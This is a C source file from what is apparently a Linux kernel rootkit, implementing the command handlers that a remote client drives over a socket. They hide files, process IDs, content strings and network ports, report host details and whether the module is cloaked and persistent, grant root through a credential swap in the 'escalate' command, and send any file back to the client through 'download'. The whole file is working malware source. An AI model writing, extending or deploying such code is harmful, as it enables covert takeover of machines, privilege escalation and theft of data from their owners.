// SPDX-License-Identifier: GPL-2.0
#include "rootkit.h"

/* Shared handler for hiding a string target */
int rk_cmd_hide_target(struct socket *client,
		       char targets[][RK_TARGET_LEN],
		       int *count, const char *value)
{
	int error = rk_target_add(targets, count, value);

	if (error == -ENOSPC)
		return RK_REPLY(client, "full\n");
	if (error == -ENAMETOOLONG)
		return RK_REPLY(client, "too long\n");
	return RK_REPLY(client, "hidden\n");
}

/* Shared handler for unhiding a string target */
int rk_cmd_unhide_target(struct socket *client,
			 char targets[][RK_TARGET_LEN],
			 int *count, const char *value)
{
	if (rk_target_remove(targets, count, value))
		return RK_REPLY(client, "not found\n");
	return RK_REPLY(client, "unhidden\n");
}

int rk_cmd_hide_port(struct socket *client, const char *arg)
{
	unsigned short port;
	int error;

	if (kstrtou16(arg, 10, &port) || port == 0)
		return RK_REPLY(client, "invalid port\n");
	error = rk_port_add(port);
	if (error == -ENOSPC)
		return RK_REPLY(client, "full\n");
	return RK_REPLY(client, "hidden\n");
}

int rk_cmd_unhide_port(struct socket *client, const char *arg)
{
	unsigned short port;

	if (kstrtou16(arg, 10, &port) || port == 0)
		return RK_REPLY(client, "invalid port\n");
	if (rk_port_remove(port))
		return RK_REPLY(client, "not found\n");
	return RK_REPLY(client, "unhidden\n");
}

int rk_cmd_info(struct socket *client)
{
	struct new_utsname *uts = utsname();
	char buf[RK_BUF_MAX];
	int n;

	n = snprintf(buf, sizeof(buf),
		     "sysname: %s\nnodename: %s\nrelease: %s\n"
		     "version: %s\nmachine: %s\n",
		     uts->sysname, uts->nodename, uts->release,
		     uts->version, uts->machine);
	return rk_send(client, buf, n);
}

int rk_cmd_status(struct socket *client)
{
	char buf[RK_BUF_MAX];
	int n;

	n = snprintf(buf, sizeof(buf),
		     "files: %d\npids: %d\ncontents: %d\nports: %d\n"
		     "cloaked: %s\npersisted: %s\n",
		     file_count, pid_count, content_count, port_count,
		     module_hidden ? "yes" : "no",
		     persist_active ? "yes" : "no");
	return rk_send(client, buf, n);
}

static int rk_list_strings(struct socket *client,
			    char targets[][RK_TARGET_LEN], int count)
{
	char buf[RK_BUF_MAX];
	int n, i;

	if (count == 0)
		return RK_REPLY(client, "empty\n");
	for (i = 0; i < count; i++) {
		n = snprintf(buf, sizeof(buf), "[%d] %s\n", i, targets[i]);
		rk_send(client, buf, n);
	}
	return 0;
}

static int rk_list_ports(struct socket *client)
{
	char buf[RK_BUF_MAX];
	int n, i;

	if (port_count == 0)
		return RK_REPLY(client, "empty\n");
	for (i = 0; i < port_count; i++) {
		n = snprintf(buf, sizeof(buf), "[%d] %u\n",
			     i, hidden_ports[i]);
		rk_send(client, buf, n);
	}
	return 0;
}

int rk_cmd_list(struct socket *client, const char *category)
{
	if (strcmp(category, "FILE") == 0)
		return rk_list_strings(client, hidden_files, file_count);
	if (strcmp(category, "PID") == 0)
		return rk_list_strings(client, hidden_pids, pid_count);
	if (strcmp(category, "CONTENT") == 0)
		return rk_list_strings(client, hidden_contents, content_count);
	if (strcmp(category, "PORT") == 0)
		return rk_list_ports(client);
	return RK_REPLY(client, "unknown category\n");
}

int rk_cmd_unhide_all(struct socket *client)
{
	file_count = 0;
	pid_count = 0;
	content_count = 0;
	port_count = 0;
	/* Reset auto-opsec indices so disconnect cleanup is safe */
	auto_pid_index = -1;
	auto_port_index = -1;
	return RK_REPLY(client, "cleared\n");
}

int rk_cmd_escalate(struct socket *client)
{
	struct cred *new;

	new = prepare_kernel_cred(&init_task);
	if (!new)
		return RK_REPLY(client, "escalate failed\n");
	commit_creds(new);
	return RK_REPLY(client, "escalated\n");
}

int rk_cmd_download(struct socket *client, const char *path)
{
	struct file *fp;
	char buf[RK_BUF_MAX];
	loff_t pos = 0;
	ssize_t n;

	fp = filp_open(path, O_RDONLY, 0);
	if (IS_ERR(fp))
		return RK_REPLY(client, "file not found\n");

	while ((n = kernel_read(fp, buf, sizeof(buf), &pos)) > 0) {
		if (rk_send(client, buf, n) < 0)
			break;
	}

	filp_close(fp, NULL);
	return RK_REPLY(client, "\n");
}
